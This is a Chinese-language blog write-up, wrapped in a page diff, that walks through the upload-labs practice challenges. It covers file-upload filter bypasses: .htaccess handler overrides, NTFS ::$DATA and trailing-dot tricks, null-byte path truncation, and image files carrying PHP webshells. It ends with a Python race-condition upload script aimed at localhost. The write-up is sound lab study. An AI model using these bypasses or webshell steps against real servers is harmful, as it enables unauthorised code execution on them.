@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>upload-labs | Tyaoo's Blog</title><meta name="keywords" content="PRACTICE"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="之前的一些关于 upload-labs 的练习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload-labs">
+<meta property="og:url" content="https://tyaoo.github.io/2020/02/28/upload-labs/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="之前的一些关于 upload-labs 的练习">
+<meta property="og:locale">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2020-02-28T14:02:16.000Z">
+<meta property="article:modified_time" content="2020-03-01T03:38:34.068Z">
+<meta property="article:author" content="Tyaoo">
+<meta property="article:tag" content="PRACTICE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2020/02/28/upload-labs/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'upload-labs',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-03-01 11:38:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">upload-labs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-02-28T14:02:16.000Z" title="Created 2020-02-28 22:02:16">2020-02-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-03-01T03:38:34.068Z" title="Updated 2020-03-01 11:38:34">2020-03-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="upload-labs"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>之前的一些关于 upload-labs 的练习</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>修改后缀名</p>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>Content-type 改为 image/gif</p>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><ol>
+<li><p>改后缀名  <code>php2, php3, php4, php5, phps, pht, phtm, phtml</code></p>
+</li>
+<li><p>重写文件解析规则绕过。上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p>
+</li>
+</ol>
+<pre><code>&lt;FilesMatch &quot;03.jpg&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><p>然后再上传一个<code>03.jpg</code></p>
+<p>执行上传的<code>03.jpg</code>脚本</p>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>查看源代码 发现黑名单几乎过滤了全部的违法后缀名 ，<strong>但少过滤了 .htaccess 后缀</strong></p>
+<ol>
+<li>上传一个.htaccess 文件 重写 服务器的文件解析  </li>
+</ol>
+<p>创建一个 .htaccess 文件</p>
+<p>内容可以是 : AddType application/x-httpd-php .jpg,可将jpg文件解析为php文件.</p>
+<p>或者是 : SetHandler application/x-httpd-php,可将其他所有文件解析为php文件.</p>
+<ol start="2">
+<li>利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：</li>
+</ol>
+<pre><code>双引号&quot;     =   点号.
+大于符号&gt;   =   问号?
+小于符号&lt;   =   星号*</code></pre><p>先把4.php文件后缀改为4.jpg  然后用bs 将文件名改为 4.php:.jpg，上传成功后会生成4.php的空文件，大小为0KB.</p>
+<p>然后再在bs 中把文件名 改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容，Webshell代码就会写入原来的4.php空文件中。</p>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>查看源代码发现 黑名单里加上了 .htaccess 后缀 ，但是没有 进行大小写过滤</p>
+<p>与 Pass-04 一样</p>
+<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>在 pass-05 的基础上加上了大小写过滤， 但发现去掉了收尾去空</p>
+<p>查了一下：<code>trim()</code>函数 : <code>移除字符串两侧的空白字符或其他预定义字符</code>.</p>
+<p>Win下<code>xx.jpg[空格] 或xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点**</p>
+<p>用 bs 在1.php 后缀名后面加一个空格成功绕过</p>
+<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>没有删除文件后缀名的点</p>
+<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>查看源代码后发现 黑名单过滤 没有去字符串 ::$DATA </p>
+<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传<code>.php::$DATA</code>绕过。(仅限windows)  上传后 自动保存为 1.php</p>
+<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code></p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>双写文件名绕过，文件名改成<code>10.pphphp</code></p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>上传路径名%00截断绕过。上传的文件名写成<code>11.jpg</code>, save_path改成<code>../upload/11.php%00</code>，最后保存下来的文件就是<code>11.php</code></p>
+<p>但这东西有点过气了，因为需要两个条件</p>
+<ol>
+<li>php版本小于5.3.4</li>
+<li>php的<strong>magic_quotes_gpc</strong>为OFF状态</li>
+</ol>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>php.ini设置 <code>magic_quotes_gpc = Off</code></p>
+<p>POST 不能解析 url 编码，所以可以用 0x00</p>
+<p>原理同<strong>Pass-11</strong>，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成<code>../upload/12.php【二进制00】</code>形式</p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>代码通过读取上传文件的<strong>前两字节判断是否为图片</strong></p>
+<pre><code> $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin); </code></pre><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p>
+<p>使用命令<code>copy normal.jpg /b + shell.php /a webshell.jpg</code>，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。<a target="_blank" rel="noopener" href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg">JPG一句话shell参考示例</a></p>
+<p>png图片处理方式同上。<a target="_blank" rel="noopener" href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png">PNG一句话shell参考示例</a></p>
+<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><code>getimagesize</code>通过检查图像文件的大小并返回图像的尺寸以及文件类型</p>
+<pre><code>list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</code></pre><p><code>image_type_to_extension</code>根据指定的图像类型返回对应的后缀名</p>
+<p>原理和示例同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
+<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><pre><code>$image_type = exif_imagetype($filename);</code></pre><p><img src="C:%5CUsers%5CIrving%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564977362026.png" alt="1564977362026"></p>
+<p>原理同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
+<p>这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片<a target="_blank" rel="noopener" href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif">示例</a>。</p>
+<p>打开被渲染后的图片，Webshell代码仍然存在。</p>
+<p>提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个<a target="_blank" rel="noopener" href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg">示例文件</a>。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。</p>
+<p>从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传<a target="_blank" rel="noopener" href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png">示例文件</a>即可，并不需要图片是正常的图片。</p>
+<p>程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。</p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>条件竞争</p>
+<pre><code class="python">#!/usr/bin/env python
+# coding:utf-8
+# Build By LandGrey
+
+import hackhttp
+from multiprocessing.dummy import Pool as ThreadPool
+
+
+def upload(lists):
+    hh = hackhttp.hackhttp()
+    raw = &quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1
+Host: localhost:8089
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8089/upload-labs/Pass-17/index.php
+Content-Type: multipart/form-data; boundary=---------------------------287032381131322
+Content-Length: 334
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+-----------------------------287032381131322
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;
+Content-Type: application/octet-stream
+
+&lt;?php
+ phpinfo();
+ ?&gt;
+-----------------------------287032381131322
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+ä¸ä¼ 
+-----------------------------287032381131322--
+&quot;&quot;&quot;
+    code, head, html, redirect, log = hh.http(&#39;http://localhost:8089/upload-labs/Pass-17/index.php&#39;, raw=raw)
+    print(str(code) + &quot;\r&quot;)
+
+
+pool = ThreadPool(10)
+pool.map(upload, range(10000))
+pool.close()
+pool.join()</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2020/02/28/upload-labs/">https://tyaoo.github.io/2020/02/28/upload-labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PRACTICE/">PRACTICE</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/02/29/2020-GYCTF-Web/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">2020 GYCTF Web</div></div></a></div><div class="next-post pull-right"><a href="/2020/02/28/sqli-labs/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">sqli-labs</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-01"><span class="toc-number">1.</span> <span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-02"><span class="toc-number">2.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-03"><span class="toc-number">3.</span> <span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-04"><span class="toc-number">4.</span> <span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-05"><span class="toc-number">5.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-06"><span class="toc-number">6.</span> <span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-07"><span class="toc-number">7.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-08"><span class="toc-number">8.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-09"><span class="toc-number">9.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-10"><span class="toc-number">10.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-11"><span class="toc-number">11.</span> <span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-12"><span class="toc-number">12.</span> <span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-13"><span class="toc-number">13.</span> <span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-14"><span class="toc-number">14.</span> <span class="toc-text">Pass-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-15"><span class="toc-number">15.</span> <span class="toc-text">Pass-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-16"><span class="toc-number">16.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-17"><span class="toc-number">17.</span> <span class="toc-text">Pass-17</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat内存马"/></a><div class="content"><a class="title" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">Tomcat内存马</a><time datetime="2021-12-06T07:51:42.000Z" title="Created 2021-12-06 15:51:42">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Handlebars AST注入"/></a><div class="content"><a class="title" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入">Handlebars AST注入</a><time datetime="2021-09-25T08:34:23.000Z" title="Created 2021-09-25 16:34:23">2021-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Dubbo反序列化漏洞研究"/></a><div class="content"><a class="title" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究">Dubbo反序列化漏洞研究</a><time datetime="2021-06-30T05:12:31.000Z" title="Created 2021-06-30 13:12:31">2021-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Yii2最新反序列化POP链分析"/></a><div class="content"><a class="title" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析">Yii2最新反序列化POP链分析</a><time datetime="2021-06-03T15:09:56.000Z" title="Created 2021-06-03 23:09:56">2021-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laravel Debug mode RCE复现"/></a><div class="content"><a class="title" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现">Laravel Debug mode RCE复现</a><time datetime="2021-05-28T06:15:46.000Z" title="Created 2021-05-28 14:15:46">2021-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
